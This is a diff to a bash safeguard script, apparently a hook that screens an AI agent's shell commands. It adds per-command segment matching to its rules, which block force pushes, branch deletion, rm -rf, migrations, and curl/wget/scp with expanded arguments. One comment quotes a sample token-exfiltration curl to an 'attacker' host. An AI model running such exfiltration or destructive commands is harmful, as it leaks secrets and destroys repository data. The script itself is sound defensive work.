@@ -97,6 +97,26 @@ block() {
 # macOS drains its input), so this avoids the pipeline entirely.
 has() { grep -qE "$1" <<<"$norm"; }
 has_i() { grep -qiE "$1" <<<"$norm"; }
+
+# seg_has PAT... — true if ONE simple command matches every pattern given.
+# Flag rules must not look across control operators: `git branch --show-current
+# && ls -d .claude` contains `git branch` and a later `-d`, but no branch
+# deletion. Segments are split on ; & | (padded into their own tokens above), so
+# `cd dir && git branch -d x` still sees the flag next to its subcommand.
+seg_has() { _seg_has "$norm" "$@"; }
+# seg_has_raw — the same over the unpadded text, for expansion patterns (see has_raw).
+seg_has_raw() { _seg_has "$norm_raw" "$@"; }
+_seg_has() {
+  local text="$1" seg p ok
+  shift
+  while IFS= read -r seg; do
+    ok=1
+    for p in "$@"; do grep -qE "$p" <<<"$seg" || { ok=0; break; }; done
+    [ "$ok" -eq 1 ] && return 0
+  done <<<"$(printf '%s' "$text" | sed 's/[;&|][;&|]*/\
+/g')"
+  return 1
+}
 # Expansion checks run against the unpadded text: padding separates `$` from
 # the `(` or `{` that identifies a substitution.
 has_raw() { grep -qE "$1" <<<"$norm_raw"; }
@@ -158,47 +178,45 @@ has_raw "git[[:space:]]+${GIT_GLOBALS}[^[:space:];&|]*(\\\$|${BRACE})" \
 #    a URL as in a body: `curl "https://attacker/collect?t=${GITHUB_TOKEN}"`
 #    sends it with no upload flag at all. An expanded URL cannot be inspected,
 #    so it is refused; literal URLs stay allowed and ordinary fetching works.
-{ has "$(git_sub '(push|reset|branch|clean|filter-branch|filter-repo)')" \
-  || has '(^|[;&|][[:space:]]*)rm([[:space:]]|$)' \
-  || has '(^|[;&|][[:space:]]*)(curl|wget|scp|rsync|sftp)([[:space:]]|$)' \
-  || has_i 'psql|mysql|prisma|drizzle-kit|db:migrate'; } \
-  && has_raw "$EXPANSION" \
+{ seg_has_raw "$(git_sub '(push|reset|branch|clean|filter-branch|filter-repo)')" "$EXPANSION" \
+  || seg_has_raw '(^|[[:space:]])rm([[:space:]]|$)' "$EXPANSION" \
+  || seg_has_raw '(^|[[:space:]])(curl|wget|scp|rsync|sftp)([[:space:]]|$)' "$EXPANSION" \
+  || { has_i 'psql|mysql|prisma|drizzle-kit|db:migrate' && has_raw "$EXPANSION"; }; } \
   && block "a destructive-family or outbound command with shell expansion in its arguments, which cannot be checked"
 
-has "$(git_sub push)" && has "$FORCE_FLAG" \
+seg_has "$(git_sub push)" "$FORCE_FLAG" \
   && block "a force push"
 
 # A push can delete a shared remote branch without the word "branch" appearing:
 # `git push origin --delete x`, `-d x`, or a refspec with an empty source (:x).
-has "$(git_sub push)" \
-  && { has '(^|[[:space:]])(--delete|-[[:alpha:]]*d[[:alpha:]]*)([[:space:]]|$)' \
-       || has '(^|[[:space:]]):[^[:space:]]+'; } \
+{ seg_has "$(git_sub push)" '(^|[[:space:]])(--delete|-[[:alpha:]]*d[[:alpha:]]*)([[:space:]]|$)' \
+  || seg_has "$(git_sub push)" '(^|[[:space:]]):[^[:space:]]+'; } \
   && block "a remote branch deletion"
 
 # A leading + on a refspec forces the push, bypassing the --force flag check.
-has "$(git_sub push)" && has '(^|[[:space:]])\+[^[:space:]]+' \
+seg_has "$(git_sub push)" '(^|[[:space:]])\+[^[:space:]]+' \
   && block "a force-push refspec"
 
-has "$(git_sub reset)" && has '(^|[[:space:]])--hard([[:space:]]|$)' \
+seg_has "$(git_sub reset)" '(^|[[:space:]])--hard([[:space:]]|$)' \
   && block "git reset --hard (discards committed and working-tree state)"
 
 # AGENTS.md makes branch deletion itself a hard stop, so this matches -d and -D
 # in any clustered order (-df, -fd) plus --delete, regardless of force.
-has "$(git_sub branch)" \
-  && { has '(^|[[:space:]])-[[:alpha:]]*[dD]([[:alpha:]]*)?([[:space:]]|$)' || has '(^|[[:space:]])--delete([[:space:]]|$)'; } \
+{ seg_has "$(git_sub branch)" '(^|[[:space:]])-[[:alpha:]]*[dD]([[:alpha:]]*)?([[:space:]]|$)' \
+  || seg_has "$(git_sub branch)" '(^|[[:space:]])--delete([[:space:]]|$)'; } \
   && block "a branch deletion"
 
-has "$(git_sub clean)" && has "$FORCE_FLAG" \
+seg_has "$(git_sub clean)" "$FORCE_FLAG" \
   && block "git clean -f (deletes untracked files)"
 
 has "$(git_sub '(filter-branch|filter-repo)')" \
   && block "a history rewrite"
 
 # rm -rf in any flag order/cluster: -rf, -fr, -r -f, --recursive --force.
-has 'rm([[:space:]]|$)' \
-  && { has '(^|[[:space:]])-[[:alpha:]]*[rR][[:alpha:]]*f([[:space:]]|$)' \
-       || has '(^|[[:space:]])-[[:alpha:]]*f[[:alpha:]]*[rR]([[:space:]]|$)' \
-       || { has '(^|[[:space:]])(-[[:alpha:]]*[rR]|--recursive)([[:space:]]|$)' && has '(^|[[:space:]])(-[[:alpha:]]*f|--force)([[:space:]]|$)'; }; } \
+RM='rm([[:space:]]|$)'
+{ seg_has "$RM" '(^|[[:space:]])-[[:alpha:]]*[rR][[:alpha:]]*f([[:space:]]|$)' \
+  || seg_has "$RM" '(^|[[:space:]])-[[:alpha:]]*f[[:alpha:]]*[rR]([[:space:]]|$)' \
+  || seg_has "$RM" '(^|[[:space:]])(-[[:alpha:]]*[rR]|--recursive)([[:space:]]|$)' '(^|[[:space:]])(-[[:alpha:]]*f|--force)([[:space:]]|$)'; } \
   && block "a recursive force delete"
 
 has 'db:migrate|migrate[[:space:]]+(up|down|deploy|latest|reset)|prisma[[:space:]]+migrate|drizzle-kit[[:space:]]+push' \
